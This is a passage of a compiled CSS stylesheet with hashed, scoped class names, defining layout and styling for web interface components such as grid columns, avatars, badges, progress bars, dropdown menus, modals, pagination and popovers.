    ._2TIYoKdMB1jFeMZh68la7r ._1E44a5ilm_MULK11R7DxCA {
      flex: none; }
    ._2TIYoKdMB1jFeMZh68la7r ._2EAlqrL2XGPW7uRWyvMOOC {
      width: 100%; }
    ._2TIYoKdMB1jFeMZh68la7r ._2zf5f4xM5ZRnKIGXqcqna_ {
      width: 91.66666667%; }
    ._2TIYoKdMB1jFeMZh68la7r ._1M39ZtZRxB-9P0Dn7I7_Ok {
      width: 83.33333333%; }
    ._2TIYoKdMB1jFeMZh68la7r ._3AVpy0z22qaRh5VHJyhsqq {
      width: 75%; }
    ._2TIYoKdMB1jFeMZh68la7r ._3LJ3Ot8x7nApwVjWHChHk1 {
      width: 66.66666667%; }
    ._2TIYoKdMB1jFeMZh68la7r ._3ILsmyPjKHnIOkNjGc0NXz {
      width: 58.33333333%; }
    ._2TIYoKdMB1jFeMZh68la7r ._2Gsun5e8Uk8RTn556CCIVU {
      width: 50%; }
    ._2TIYoKdMB1jFeMZh68la7r .wwbhdAW6ikIaUeq9PnFzp {
      width: 41.66666667%; }
    ._2TIYoKdMB1jFeMZh68la7r .msSzUm9q3whphvPrkLDlv {
      width: 33.33333333%; }
    ._2TIYoKdMB1jFeMZh68la7r ._3qdXHoU_F7DBHQz3CjZKF4 {
      width: 25%; }
    ._2TIYoKdMB1jFeMZh68la7r .B4Y7MD4JD-Q1_wwB-N1lZ {
      width: 16.66666667%; }
    ._2TIYoKdMB1jFeMZh68la7r ._790z_zIG9nuHowpN0qiY_ {
      width: 8.33333333%; }
    ._2TIYoKdMB1jFeMZh68la7r ._1E44a5ilm_MULK11R7DxCA {
      width: auto; }
    ._2TIYoKdMB1jFeMZh68la7r ._3Al_YTeteGZdP1d0PRN8nm {
      display: none !important; }
    ._2TIYoKdMB1jFeMZh68la7r ._2O3Ds-SPt18AMhvI7yARlw {
      display: block !important; } }
  ._2TIYoKdMB1jFeMZh68la7r ._2Ia0TmJXHMknj4TNh4zUBg {
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    padding-bottom: 4rem;
    padding-top: 4rem; }
    ._2TIYoKdMB1jFeMZh68la7r ._2Ia0TmJXHMknj4TNh4zUBg._147c7yMVLz3XSXeTUyUqkV {
      padding-bottom: 2rem;
      padding-top: 2rem; }
    ._2TIYoKdMB1jFeMZh68la7r ._2Ia0TmJXHMknj4TNh4zUBg._21GrRaX18gcUPhDwGyvgGt {
      padding-bottom: 8rem;
      padding-top: 8rem; }
    ._2TIYoKdMB1jFeMZh68la7r ._2Ia0TmJXHMknj4TNh4zUBg .fPNJxoKFbCXWtkWb2UEQa {
      padding: 8px; }
  ._2TIYoKdMB1jFeMZh68la7r ._25grm0NTXF6v7lrFNkDKWp {
    align-items: stretch;
    display: flex;
    flex-wrap: wrap;
    justify-content: space-between; }
    ._2TIYoKdMB1jFeMZh68la7r ._25grm0NTXF6v7lrFNkDKWp ._3XsehGJxKvBGBLZpP5VsUa {
      align-items: center;
      display: flex;
      flex: 1 0 0; }
      ._2TIYoKdMB1jFeMZh68la7r ._25grm0NTXF6v7lrFNkDKWp ._3XsehGJxKvBGBLZpP5VsUa:not(:first-child):last-child {
        justify-content: flex-end; }
    ._2TIYoKdMB1jFeMZh68la7r ._25grm0NTXF6v7lrFNkDKWp ._1hGPLI_MW9jwt0KsdY0m0v {
      align-items: center;
      display: flex;
      flex: 0 0 auto; }
    ._2TIYoKdMB1jFeMZh68la7r ._25grm0NTXF6v7lrFNkDKWp ._8IxbiAc5z5nHWlFqxQatX {
      font-size: 18px;
      text-decoration: none; }
  ._2TIYoKdMB1jFeMZh68la7r ._2HUihj_-roQI7YzIzW3ybs input:checked ~ ._2aI9lUrbx9CE24bDt38xFK ._3XKWjCQlF8GhQbfrUrhkWm, ._2TIYoKdMB1jFeMZh68la7r ._2HUihj_-roQI7YzIzW3ybs[open] ._2aI9lUrbx9CE24bDt38xFK ._3XKWjCQlF8GhQbfrUrhkWm {
    transform: rotate(90deg); }
  ._2TIYoKdMB1jFeMZh68la7r ._2HUihj_-roQI7YzIzW3ybs input:checked ~ ._39lVjD_CytkjMvioCFL9Zd, ._2TIYoKdMB1jFeMZh68la7r ._2HUihj_-roQI7YzIzW3ybs[open] ._39lVjD_CytkjMvioCFL9Zd {
    max-height: 50rem; }
  ._2TIYoKdMB1jFeMZh68la7r ._2HUihj_-roQI7YzIzW3ybs ._2aI9lUrbx9CE24bDt38xFK {
    display: block;
    padding: 4px 8px; }
    ._2TIYoKdMB1jFeMZh68la7r ._2HUihj_-roQI7YzIzW3ybs ._2aI9lUrbx9CE24bDt38xFK ._3XKWjCQlF8GhQbfrUrhkWm {
      transition: transform .25s; }
  ._2TIYoKdMB1jFeMZh68la7r ._2HUihj_-roQI7YzIzW3ybs ._39lVjD_CytkjMvioCFL9Zd {
    margin-bottom: 8px;
    max-height: 0;
    overflow: hidden;
    transition: max-height .25s; }
  ._2TIYoKdMB1jFeMZh68la7r summary._2aI9lUrbx9CE24bDt38xFK::-webkit-details-marker {
    display: none; }
  ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT {
    font-size: 16px;
    height: 32px;
    width: 32px;
    background: #56a4ff;
    border-radius: 50%;
    color: rgba(255, 255, 255, 0.85);
    display: inline-block;
    font-weight: 300;
    line-height: 1.25;
    margin: 0;
    position: relative;
    vertical-align: middle; }
    ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT._3BeQYW0NfTQUg7d6A93Ra7 {
      font-size: 8px;
      height: 16px;
      width: 16px; }
    ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT._1BVRLzCKnmudwuppzAvI2z {
      font-size: 12px;
      height: 24px;
      width: 24px; }
    ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT._1ZLHd8N_0w6jGDL_zEc1Xr {
      font-size: 24px;
      height: 48px;
      width: 48px; }
    ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT._3cDnkyM_aciYLvQ8osZxbA {
      font-size: 32px;
      height: 64px;
      width: 64px; }
    ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT img {
      border-radius: 50%;
      height: 100%;
      position: relative;
      width: 100%;
      z-index: 1; }
    ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT ._2hR_vzctBp8tCddg_zWWwU,
    ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT .LF9u8fo9YZ5xR1Rt-IdtU {
      background: #fff;
      bottom: 14.64%;
      height: 50%;
      padding: 2px;
      position: absolute;
      right: 14.64%;
      transform: translate(50%, 50%);
      width: 50%;
      z-index: 2; }
    ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT .LF9u8fo9YZ5xR1Rt-IdtU {
      background: #9b9b9b;
      box-shadow: 0 0 0 2px #fff;
      border-radius: 50%;
      height: .5em;
      width: .5em; }
      ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT .LF9u8fo9YZ5xR1Rt-IdtU._3EDGV67j8nDJ1I-rl7ZN8y {
        background: #32b643; }
      ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT .LF9u8fo9YZ5xR1Rt-IdtU.AWMxvGB5gbVWzVDg8ZsOZ {
        background: #a94442; }
      ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT .LF9u8fo9YZ5xR1Rt-IdtU._1S3C6zZ1H-OReOjDIpEPqf {
        background: #ffb700; }
    ._2TIYoKdMB1jFeMZh68la7r ._2VPa3NdAaRnjEBSxntVXPT[data-initial]::before {
      color: currentColor;
      content: attr(data-initial);
      left: 50%;
      position: absolute;
      top: 50%;
      transform: translate(-50%, -50%);
      z-index: 1; }
  ._2TIYoKdMB1jFeMZh68la7r ._2KuL00fCf1isHsLooxajCU {
    position: relative;
    white-space: nowrap; }
    ._2TIYoKdMB1jFeMZh68la7r ._2KuL00fCf1isHsLooxajCU[data-badge]::after, ._2TIYoKdMB1jFeMZh68la7r ._2KuL00fCf1isHsLooxajCU:not([data-badge])::after {
      background: #56a4ff;
      background-clip: padding-box;
      border-radius: .5rem;
      box-shadow: 0 0 0 0.1rem #fff;
      color: #fff;
      content: attr(data-badge);
      display: inline-block;
      transform: translate(-0.05rem, -0.5rem); }
    ._2TIYoKdMB1jFeMZh68la7r ._2KuL00fCf1isHsLooxajCU[data-badge]::after {
      font-size: 12px;
      height: .9rem;
      line-height: 1;
      min-width: .9rem;
      padding: .1rem .2rem;
      text-align: center;
      white-space: nowrap; }
    ._2TIYoKdMB1jFeMZh68la7r ._2KuL00fCf1isHsLooxajCU:not([data-badge])::after, ._2TIYoKdMB1jFeMZh68la7r ._2KuL00fCf1isHsLooxajCU[data-badge=""]::after {
      height: 6px;
      min-width: 6px;
      padding: 0;
      width: 6px; }
    ._2TIYoKdMB1jFeMZh68la7r ._2KuL00fCf1isHsLooxajCU.pLKju5v7sW809fWwxCIjC::after {
      position: absolute;
      top: 0;
      right: 0;
      transform: translate(50%, -50%); }
    ._2TIYoKdMB1jFeMZh68la7r ._2KuL00fCf1isHsLooxajCU._2VPa3NdAaRnjEBSxntVXPT::after {
      position: absolute;
      top: 14.64%;
      right: 14.64%;
      transform: translate(50%, -50%);
      z-index: 100; }
  ._2TIYoKdMB1jFeMZh68la7r .bcygPMMVzNsPJSbfK9X7- {
    list-style: none;
    margin: 4px 0;
    padding: 4px 0; }
    ._2TIYoKdMB1jFeMZh68la7r .bcygPMMVzNsPJSbfK9X7- ._3-Ynsi5FrhWYTT6dsewV6V {
      color: #4f4f4f;
      display: inline-block;
      margin: 0;
      padding: 4px 0; }
      ._2TIYoKdMB1jFeMZh68la7r .bcygPMMVzNsPJSbfK9X7- ._3-Ynsi5FrhWYTT6dsewV6V:not(:last-child) {
        margin-right: 4px; }
        ._2TIYoKdMB1jFeMZh68la7r .bcygPMMVzNsPJSbfK9X7- ._3-Ynsi5FrhWYTT6dsewV6V:not(:last-child) a {
          color: #4f4f4f; }
      ._2TIYoKdMB1jFeMZh68la7r .bcygPMMVzNsPJSbfK9X7- ._3-Ynsi5FrhWYTT6dsewV6V:not(:first-child)::before {
        color: #4f4f4f;
        content: "/";
        padding-right: 8px; }
  ._2TIYoKdMB1jFeMZh68la7r ._3UD1Vv73Xz8qBdtgaXlY__ {
    background: #eef0f3;
    border-radius: 2px;
    display: flex;
    flex-wrap: nowrap;
    height: 16px;
    width: 100%; }
    ._2TIYoKdMB1jFeMZh68la7r ._3UD1Vv73Xz8qBdtgaXlY__._3GFeslK49bMkoAbYElgT6 {
      height: 4px; }
    ._2TIYoKdMB1jFeMZh68la7r ._3UD1Vv73Xz8qBdtgaXlY__ ._3pigiJ_ti7tI3t9sGemmrO {
      background: #56a4ff;
      color: #fff;
      display: block;
      font-size: 12px;
      flex-shrink: 0;
      line-height: 16px;
      height: 100%;
      position: relative;
      text-align: center;
      width: 0; }
      ._2TIYoKdMB1jFeMZh68la7r ._3UD1Vv73Xz8qBdtgaXlY__ ._3pigiJ_ti7tI3t9sGemmrO:first-child {
        border-bottom-left-radius: 2px;
        border-top-left-radius: 2px; }
      ._2TIYoKdMB1jFeMZh68la7r ._3UD1Vv73Xz8qBdtgaXlY__ ._3pigiJ_ti7tI3t9sGemmrO:last-child {
        border-bottom-right-radius: 2px;
        border-top-right-radius: 2px;
        flex-shrink: 1; }
  ._2TIYoKdMB1jFeMZh68la7r .oUaf6FlojAd3KOUzaVRZA {
    height: 2px;
    margin: 8px 0;
    position: relative; }
    ._2TIYoKdMB1jFeMZh68la7r .oUaf6FlojAd3KOUzaVRZA ._3pigiJ_ti7tI3t9sGemmrO {
      left: 0;
      padding: 0;
      position: absolute; }
      ._2TIYoKdMB1jFeMZh68la7r .oUaf6FlojAd3KOUzaVRZA ._3pigiJ_ti7tI3t9sGemmrO:not(:last-child):first-child {
        background: #eef0f3;
        z-index: 1; }
    ._2TIYoKdMB1jFeMZh68la7r .oUaf6FlojAd3KOUzaVRZA ._7fzdezv3dBijQZA58_zJd {
      background: #56a4ff;
      border: 0;
      border-radius: 50%;
      height: 12px;
      padding: 0;
      position: absolute;
      right: 0;
      top: 50%;
      transform: translate(50%, -50%);
      width: 12px; }
      ._2TIYoKdMB1jFeMZh68la7r .oUaf6FlojAd3KOUzaVRZA ._7fzdezv3dBijQZA58_zJd:active {
        box-shadow: 0 0 0 0.1rem #56a4ff; }
  ._2TIYoKdMB1jFeMZh68la7r ._2K3Wan8l4P-bZjFXt-kdS8 {
    background: #fff;
    border: 1px solid #dadee4;
    border-radius: 2px;
    display: flex;
    flex-direction: column; }
    ._2TIYoKdMB1jFeMZh68la7r ._2K3Wan8l4P-bZjFXt-kdS8 ._1r_GAGOORUQhxKCE0wNBiq,
    ._2TIYoKdMB1jFeMZh68la7r ._2K3Wan8l4P-bZjFXt-kdS8 ._18YxcU4rRaDxIelfv-JygF,
    ._2TIYoKdMB1jFeMZh68la7r ._2K3Wan8l4P-bZjFXt-kdS8 ._2Du5A7HAcTSHrtCp3RaV1U {
      padding: 16px;
      padding-bottom: 0; }
      ._2TIYoKdMB1jFeMZh68la7r ._2K3Wan8l4P-bZjFXt-kdS8 ._1r_GAGOORUQhxKCE0wNBiq:last-child,
      ._2TIYoKdMB1jFeMZh68la7r ._2K3Wan8l4P-bZjFXt-kdS8 ._18YxcU4rRaDxIelfv-JygF:last-child,
      ._2TIYoKdMB1jFeMZh68la7r ._2K3Wan8l4P-bZjFXt-kdS8 ._2Du5A7HAcTSHrtCp3RaV1U:last-child {
        padding-bottom: 16px; }
    ._2TIYoKdMB1jFeMZh68la7r ._2K3Wan8l4P-bZjFXt-kdS8 ._18YxcU4rRaDxIelfv-JygF {
      flex: 1 1 auto; }
    ._2TIYoKdMB1jFeMZh68la7r ._2K3Wan8l4P-bZjFXt-kdS8 .w1msOP28YxpDISsMB1p5g {
      padding-top: 16px; }
      ._2TIYoKdMB1jFeMZh68la7r ._2K3Wan8l4P-bZjFXt-kdS8 .w1msOP28YxpDISsMB1p5g:first-child {
        padding-top: 0; }
        ._2TIYoKdMB1jFeMZh68la7r ._2K3Wan8l4P-bZjFXt-kdS8 .w1msOP28YxpDISsMB1p5g:first-child img {
          border-top-left-radius: 2px;
          border-top-right-radius: 2px; }
      ._2TIYoKdMB1jFeMZh68la7r ._2K3Wan8l4P-bZjFXt-kdS8 .w1msOP28YxpDISsMB1p5g:last-child img {
        border-bottom-left-radius: 2px;
        border-bottom-right-radius: 2px; }
  ._2TIYoKdMB1jFeMZh68la7r ._1DE2qv5fw1AzYO2enhE422 {
    align-items: center;
    background: #eef0f3;
    border-radius: 5rem;
    display: inline-flex;
    font-size: 90%;
    height: 24px;
    line-height: 16px;
    margin: 2px;
    max-width: 320px;
    overflow: hidden;
    padding: 4px 8px;
    text-decoration: none;
    text-overflow: ellipsis;
    vertical-align: middle;
    white-space: nowrap; }
    ._2TIYoKdMB1jFeMZh68la7r ._1DE2qv5fw1AzYO2enhE422._3W5bl2D2eilwk7cQCvyY-j {
      background: #56a4ff;
      color: #fff; }
    ._2TIYoKdMB1jFeMZh68la7r ._1DE2qv5fw1AzYO2enhE422 ._2VPa3NdAaRnjEBSxntVXPT {
      margin-left: -8px;
      margin-right: 4px; }
    ._2TIYoKdMB1jFeMZh68la7r ._1DE2qv5fw1AzYO2enhE422 ._1gJD7NjxJhH5siXcGmfBo9 {
      border-radius: 50%;
      transform: scale(0.75); }
  ._2TIYoKdMB1jFeMZh68la7r ._1cS2bzCVoNFupgXIp8oUHd {
    display: inline-block;
    position: relative; }
    ._2TIYoKdMB1jFeMZh68la7r ._1cS2bzCVoNFupgXIp8oUHd ._1Qib62vVScxySwk_2VFXts {
      animation: G8Rjm9nYS2VXARJVl8WRN .15s ease 1;
      display: none;
      left: 0;
      max-height: 50vh;
      overflow-y: auto;
      position: absolute;
      top: 100%; }
    ._2TIYoKdMB1jFeMZh68la7r ._1cS2bzCVoNFupgXIp8oUHd._3wfmkyKD-BNg6k2yOCl24g ._1Qib62vVScxySwk_2VFXts {
      left: auto;
      right: 0; }
    ._2TIYoKdMB1jFeMZh68la7r ._1cS2bzCVoNFupgXIp8oUHd._3W5bl2D2eilwk7cQCvyY-j ._1Qib62vVScxySwk_2VFXts,
    ._2TIYoKdMB1jFeMZh68la7r ._1cS2bzCVoNFupgXIp8oUHd .I_x1WOpxCnul4S05E3ieo:focus + ._1Qib62vVScxySwk_2VFXts,
    ._2TIYoKdMB1jFeMZh68la7r ._1cS2bzCVoNFupgXIp8oUHd ._1Qib62vVScxySwk_2VFXts:hover {
      display: block; }
    ._2TIYoKdMB1jFeMZh68la7r ._1cS2bzCVoNFupgXIp8oUHd .mT0i6UZcnoF51maK7he_v .I_x1WOpxCnul4S05E3ieo:nth-last-child(2) {
      border-bottom-right-radius: 2px;
      border-top-right-radius: 2px; }
  ._2TIYoKdMB1jFeMZh68la7r .RX3RhuhnZ-BHrSChDru0x {
    background: #f7f8f9;
    border-radius: 2px;
    color: #4f4f4f;
    text-align: center;
    padding: 64px 32px; }
    ._2TIYoKdMB1jFeMZh68la7r .RX3RhuhnZ-BHrSChDru0x ._3nAxdodfAAzjHA7-66Wjua {
      margin-bottom: 16px; }
    ._2TIYoKdMB1jFeMZh68la7r .RX3RhuhnZ-BHrSChDru0x ._2TBGX_kUgUXINSTWjg_lJ-,
    ._2TIYoKdMB1jFeMZh68la7r .RX3RhuhnZ-BHrSChDru0x .k3WgAY51c4g4d7T5J2OoD {
      margin: 8px auto; }
    ._2TIYoKdMB1jFeMZh68la7r .RX3RhuhnZ-BHrSChDru0x ._1FAz9dgZjvS5DjpPgx-W50 {
      margin-top: 16px; }
  ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts {
    box-shadow: 0 0.05rem 0.2rem rgba(48, 55, 66, 0.3);
    background: #fff;
    border-radius: 2px;
    list-style: none;
    margin: 0;
    min-width: 180px;
    padding: 8px;
    transform: translateY(4px);
    z-index: 300; }
    ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts._3zoh5h38fX9jxafsunkPY8 {
      background: transparent;
      box-shadow: none; }
    ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts .lBuzVxQkOKTxNbT9qNfYE {
      margin-top: 0;
      padding: 0 8px;
      position: relative;
      text-decoration: none; }
      ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts .lBuzVxQkOKTxNbT9qNfYE > a {
        border-radius: 2px;
        color: inherit;
        display: block;
        margin: 0 -8px;
        padding: 4px 8px;
        text-decoration: none; }
        ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts .lBuzVxQkOKTxNbT9qNfYE > a:focus, ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts .lBuzVxQkOKTxNbT9qNfYE > a:hover {
          background: white;
          color: #56a4ff; }
        ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts .lBuzVxQkOKTxNbT9qNfYE > a:active, ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts .lBuzVxQkOKTxNbT9qNfYE > a._3W5bl2D2eilwk7cQCvyY-j {
          background: white;
          color: #56a4ff; }
      ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts .lBuzVxQkOKTxNbT9qNfYE ._1xCS3I4b2VHnCZYxDERCm-,
      ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts .lBuzVxQkOKTxNbT9qNfYE ._2Hc1AykRRhCEXfGen6nQ6f,
      ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts .lBuzVxQkOKTxNbT9qNfYE ._1sPkJmtKW_OIQWFv4yCxSG {
        margin: 2px 0; }
      ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts .lBuzVxQkOKTxNbT9qNfYE + .lBuzVxQkOKTxNbT9qNfYE {
        margin-top: 4px; }
    ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts ._3XR7Yi2h7Z3PCMcejrc-31 {
      align-items: center;
      display: flex;
      height: 100%;
      position: absolute;
      right: 0;
      top: 0; }
      ._2TIYoKdMB1jFeMZh68la7r ._1Qib62vVScxySwk_2VFXts ._3XR7Yi2h7Z3PCMcejrc-31 ._3RvQwLt8foNujPm0VoDh05 {
        margin-right: 8px; }
  ._2TIYoKdMB1jFeMZh68la7r ._2TFNUR4g8PgaT2OSGa_1Sa {
    align-items: center;
    bottom: 0;
    display: none;
    justify-content: center;
    left: 0;
    opacity: 0;
    overflow: hidden;
    padding: 8px;
    position: fixed;
    right: 0;
    top: 0; }
    ._2TIYoKdMB1jFeMZh68la7r ._2TFNUR4g8PgaT2OSGa_1Sa:target, ._2TIYoKdMB1jFeMZh68la7r ._2TFNUR4g8PgaT2OSGa_1Sa._3W5bl2D2eilwk7cQCvyY-j {
      display: flex;
      opacity: 1;
      z-index: 400; }
      ._2TIYoKdMB1jFeMZh68la7r ._2TFNUR4g8PgaT2OSGa_1Sa:target ._2SW9CetybRHrZEzJCR_4oG, ._2TIYoKdMB1jFeMZh68la7r ._2TFNUR4g8PgaT2OSGa_1Sa._3W5bl2D2eilwk7cQCvyY-j ._2SW9CetybRHrZEzJCR_4oG {
        background: rgba(247, 248, 249, 0.75);
        bottom: 0;
        cursor: default;
        display: block;
        left: 0;
        position: absolute;
        right: 0;
        top: 0; }
      ._2TIYoKdMB1jFeMZh68la7r ._2TFNUR4g8PgaT2OSGa_1Sa:target .siUcEBNNMSVKzwbFxu0YG, ._2TIYoKdMB1jFeMZh68la7r ._2TFNUR4g8PgaT2OSGa_1Sa._3W5bl2D2eilwk7cQCvyY-j .siUcEBNNMSVKzwbFxu0YG {
        animation: G8Rjm9nYS2VXARJVl8WRN .2s ease 1;
        z-index: 1; }
    ._2TIYoKdMB1jFeMZh68la7r ._2TFNUR4g8PgaT2OSGa_1Sa._1LTOQ6KO6hh0bQQGaJfAmr .siUcEBNNMSVKzwbFxu0YG {
      max-width: 320px;
      padding: 0 8px; }
    ._2TIYoKdMB1jFeMZh68la7r ._2TFNUR4g8PgaT2OSGa_1Sa._345zqJhmeb6Fr3Kwfshlwh ._2SW9CetybRHrZEzJCR_4oG {
      background: #fff; }
    ._2TIYoKdMB1jFeMZh68la7r ._2TFNUR4g8PgaT2OSGa_1Sa._345zqJhmeb6Fr3Kwfshlwh .siUcEBNNMSVKzwbFxu0YG {
      box-shadow: none;
      max-width: 960px; }
  ._2TIYoKdMB1jFeMZh68la7r .siUcEBNNMSVKzwbFxu0YG {
    box-shadow: 0 0.2rem 0.5rem rgba(48, 55, 66, 0.3);
    background: #fff;
    border-radius: 2px;
    display: flex;
    flex-direction: column;
    max-height: 75vh;
    max-width: 640px;
    padding: 0 16px;
    width: 100%; }
    ._2TIYoKdMB1jFeMZh68la7r .siUcEBNNMSVKzwbFxu0YG._3pwYQxT8zbJztypsYusrdY {
      max-height: 100vh; }
    ._2TIYoKdMB1jFeMZh68la7r .siUcEBNNMSVKzwbFxu0YG ._3ZrDgW__n69yJBZqb7c-NB {
      color: #303742;
      padding: 16px; }
    ._2TIYoKdMB1jFeMZh68la7r .siUcEBNNMSVKzwbFxu0YG ._2ecoRVr33fVn1REZ8x7gWi {
      overflow-y: auto;
      padding: 16px;
      position: relative; }
    ._2TIYoKdMB1jFeMZh68la7r .siUcEBNNMSVKzwbFxu0YG ._1mZlLu2Vo2YjHwGQebvLrj {
      padding: 16px;
      text-align: right; }
  ._2TIYoKdMB1jFeMZh68la7r .MaPkx7aXi1lEyAQlINQ6Y {
    display: flex;
    flex-direction: column;
    list-style: none;
    margin: 4px 0; }
    ._2TIYoKdMB1jFeMZh68la7r .MaPkx7aXi1lEyAQlINQ6Y ._1L4jBAxNe19NELEtViNeFz a {
      color: #4f4f4f;
      padding: 4px 8px;
      text-decoration: none; }
      ._2TIYoKdMB1jFeMZh68la7r .MaPkx7aXi1lEyAQlINQ6Y ._1L4jBAxNe19NELEtViNeFz a:focus, ._2TIYoKdMB1jFeMZh68la7r .MaPkx7aXi1lEyAQlINQ6Y ._1L4jBAxNe19NELEtViNeFz a:hover {
        color: #56a4ff; }
    ._2TIYoKdMB1jFeMZh68la7r .MaPkx7aXi1lEyAQlINQ6Y ._1L4jBAxNe19NELEtViNeFz._3W5bl2D2eilwk7cQCvyY-j > a {
      color: #353535;
      font-weight: bold; }
      ._2TIYoKdMB1jFeMZh68la7r .MaPkx7aXi1lEyAQlINQ6Y ._1L4jBAxNe19NELEtViNeFz._3W5bl2D2eilwk7cQCvyY-j > a:focus, ._2TIYoKdMB1jFeMZh68la7r .MaPkx7aXi1lEyAQlINQ6Y ._1L4jBAxNe19NELEtViNeFz._3W5bl2D2eilwk7cQCvyY-j > a:hover {
        color: #56a4ff; }
    ._2TIYoKdMB1jFeMZh68la7r .MaPkx7aXi1lEyAQlINQ6Y .MaPkx7aXi1lEyAQlINQ6Y {
      margin-bottom: 8px;
      margin-left: 16px; }
  ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG {
    display: flex;
    list-style: none;
    margin: 4px 0;
    padding: 4px 0; }
    ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG ._2EzQCHG4QLvwAkT6sDlxwW {
      margin: 4px 1px; }
      ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG ._2EzQCHG4QLvwAkT6sDlxwW span {
        display: inline-block;
        padding: 4px 4px; }
      ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG ._2EzQCHG4QLvwAkT6sDlxwW a {
        border-radius: 2px;
        display: inline-block;
        padding: 4px 8px;
        text-decoration: none; }
        ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG ._2EzQCHG4QLvwAkT6sDlxwW a:focus, ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG ._2EzQCHG4QLvwAkT6sDlxwW a:hover {
          color: #56a4ff; }
      ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG ._2EzQCHG4QLvwAkT6sDlxwW._3GGIaDVH_KBki137QTNeML a {
        cursor: default;
        opacity: .5;
        pointer-events: none; }
      ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG ._2EzQCHG4QLvwAkT6sDlxwW._3W5bl2D2eilwk7cQCvyY-j a {
        background: #56a4ff;
        color: #fff; }
      ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG ._2EzQCHG4QLvwAkT6sDlxwW._1qE570NWD-Rg-Bi9I591xf, ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG ._2EzQCHG4QLvwAkT6sDlxwW._2S1LOuvq5K5a9GZc7OlpT0 {
        flex: 1 0 50%; }
      ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG ._2EzQCHG4QLvwAkT6sDlxwW._2S1LOuvq5K5a9GZc7OlpT0 {
        text-align: right; }
      ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG ._2EzQCHG4QLvwAkT6sDlxwW ._3CUvwikKImuwnBiwZzsKG5 {
        margin: 0; }
      ._2TIYoKdMB1jFeMZh68la7r ._1bAEOxuAPTnNTtLSuNj5FG ._2EzQCHG4QLvwAkT6sDlxwW ._3WMTplJZXIMLlrl0uNzuVo {
        margin: 0;
        opacity: .5; }
  ._2TIYoKdMB1jFeMZh68la7r ._2TMcufOHjQuhq2Bs9X-uoU {
    border: 1px solid #dadee4;
    border-radius: 2px;
    display: flex;
    flex-direction: column; }
    ._2TIYoKdMB1jFeMZh68la7r ._2TMcufOHjQuhq2Bs9X-uoU .ZvaVxwS1Dtgcnlub_YC0q,
    ._2TIYoKdMB1jFeMZh68la7r ._2TMcufOHjQuhq2Bs9X-uoU ._2wX_0E6xqKTKxEWb2VKihJ {
      flex: 0 0 auto;
      padding: 16px; }
    ._2TIYoKdMB1jFeMZh68la7r ._2TMcufOHjQuhq2Bs9X-uoU ._1MjcpvfUpNe5tthY9Or2Ux {
      flex: 0 0 auto; }
    ._2TIYoKdMB1jFeMZh68la7r ._2TMcufOHjQuhq2Bs9X-uoU ._1k3bDHt4QCLSwIzUI3DJ4y {
      flex: 1 1 auto;
      overflow-y: auto;
      padding: 0 16px; }
  ._2TIYoKdMB1jFeMZh68la7r .k4BsbwJUUSLYx67DOgIXm {
    display: inline-block;
    position: relative; }
    ._2TIYoKdMB1jFeMZh68la7r .k4BsbwJUUSLYx67DOgIXm ._3NNpDr3ssxUpx5_jEVHZcj {
      left: 50%;
      opacity: 0;
      padding: 8px;
      position: absolute;
      top: 0;
      transform: translate(-50%, -50%) scale(0);
      transition: transform .2s;
      width: 320px;
      z-index: 300; }
    ._2TIYoKdMB1jFeMZh68la7r .k4BsbwJUUSLYx67DOgIXm *:focus + ._3NNpDr3ssxUpx5_jEVHZcj,
    ._2TIYoKdMB1jFeMZh68la7r .k4BsbwJUUSLYx67DOgIXm:hover ._3NNpDr3ssxUpx5_jEVHZcj {
      display: block;
      opacity: 1;
      transform: translate(-50%, -100%) scale(1); }
